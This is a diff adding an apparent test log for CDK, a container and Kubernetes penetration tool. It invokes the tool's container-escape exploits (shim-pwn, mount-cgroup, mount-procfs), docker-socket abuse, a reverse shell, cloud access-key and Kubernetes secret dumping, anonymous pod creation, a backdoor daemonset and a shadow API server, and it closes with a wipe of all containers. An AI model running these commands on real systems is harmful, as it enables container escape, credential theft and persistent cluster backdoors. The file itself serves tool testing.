@@ -1,0 +1,68 @@
+---------- build CDK binary ----------
+---------- upload CDK to ECS, ACK, Selfbuild-K8s ----------
+[upload] CDK binary to self-build k8s master node
+[TEST] [Selfbuild k8s master node] kubectl cp /root/cdk-fabric myappnew:/cdk-fabric
+[TEST] [Selfbuild k8s master node] kubectl exec myappnew ls /cdk-fabric
+---------- upload all done ----------
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric "
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric --help"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric -v"
+[TEST] [ECS] /root/cdk-fabric evaluate --full
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --net=host ubuntu:latest /bin/sh -c "/cdk-fabric evaluate --full"
+[TEST] [alpine:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --net=host alpine:latest /bin/sh -c "/cdk-fabric evaluate --full"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric ifconfig"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric ps"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric ucurl"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest /bin/sh -c "/cdk-fabric ucurl get /var/run/docker.sock http://127.0.0.1/info \"\""
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric probe"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric probe 1.1.1.1 22 10 1000"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric probe 1.1.1.1 22 50-999999 1000"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric vi"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric nc"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --net=host ubuntu:latest /bin/sh -c "/cdk-fabric run --list"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --net=host ubuntu:latest /bin/sh -c "/cdk-fabric run shim-pwn \"touch /tmp/shim-pwn-success\""
+[TEST] [ECS] rm /tmp/shim-pwn-success
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run docker-sock-check"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run docker-sock-check /var/run/docker.sock"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest /bin/sh -c "/cdk-fabric run docker-sock-check /var/run/docker.sock"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run docker-sock-deploy"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run docker-sock-deploy /var/run/docker.sock alpine:latest"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest /bin/sh -c "/cdk-fabric run docker-sock-deploy /var/run/docker.sock alpine:latest"
+[TEST] [ECS] docker ps | grep alpine
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run mount-cgroup"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run mount-cgroup \"touch /tmp/mount-cgroup-success\""
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --privileged=true ubuntu:latest /bin/sh -c "/cdk-fabric run mount-cgroup \"touch /tmp/mount-cgroup-success\""
+[TEST] [ECS] rm /tmp/mount-cgroup-success
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run service-probe"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run service-probe 192.168.1.1-^^10"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run service-probe 127.0.0.1"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run mount-disk"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm --privileged=true ubuntu:latest /bin/sh -c "/cdk-fabric run mount-disk"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run mount-procfs"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /proc:/host_proc ubuntu:latest /bin/sh -c "/cdk-fabric run mount-procfs /host_proc \"touch /tmp/mount-procfs-success\""
+[TEST] [ECS] rm /tmp/mount-procfs-success
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run reverse-shell"
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm  ubuntu:latest /bin/sh -c "/cdk-fabric run ak-leakage"
+[TEST] [ECS] echo "AKIA99999999999999AB" > /tmp/ak-leakage
+[TEST] [ubuntu:latest] docker run -v /root/cdk-fabric:/cdk-fabric --rm -v /tmp/ak-leakage:/tmp/ak-leakage ubuntu:latest /bin/sh -c "/cdk-fabric run ak-leakage /tmp"
+[TEST] [ECS] rm /tmp/ak-leakage
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric evaluate
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric evaluate
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-configmap-dump
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-configmap-dump auto
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-configmap-dump /tmp/jkdhahdjfka2
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-secret-dump
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-secret-dump auto
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric kcurl
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric kcurl default get https://172.21.0.1:443/api/v1/nodes
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric kcurl anonymous get https://172.21.0.1:443/api/v1/nodes
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric         kcurl anonymous post 'https://172.21.0.1:443/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply' '{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"cdxy-test-2021\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"ubuntu:latest\",\"name\":\"container\"}]}}\n"},"name":"cdxy-test-2021","namespace":"default"},"spec":{"containers":[{"image":"ubuntu:latest","name":"container"}]}}'        
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-backdoor-daemonset 1
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run k8s-backdoor-daemonset anonymous ubuntu
+[TEST] [K8s Pod] kubectl exec myappnew -- /cdk-fabric run istio-check
+[TEST] [Selfbuild k8s master node] kubectl exec myappnew -- /cdk-fabric evaluate
+[TEST] [Selfbuild k8s master node] kubectl delete pod kube-apiserver-cn-beijing.192.168.0.150-shadow -n kube-system
+[TEST] [Selfbuild k8s master node] kubectl exec myappnew -- /cdk-fabric run k8s-shadow-apiserver default
+[TEST] [Selfbuild k8s master node] kubectl exec myappnew -- /cdk-fabric run k8s-shadow-apiserver anonymous
+[TEST] [Selfbuild k8s master node] kubectl exec myappnew -- curl 192.168.0.150:9443
+[TEST] [ECS] docker stop $(docker ps -q) & docker rm $(docker ps -aq)
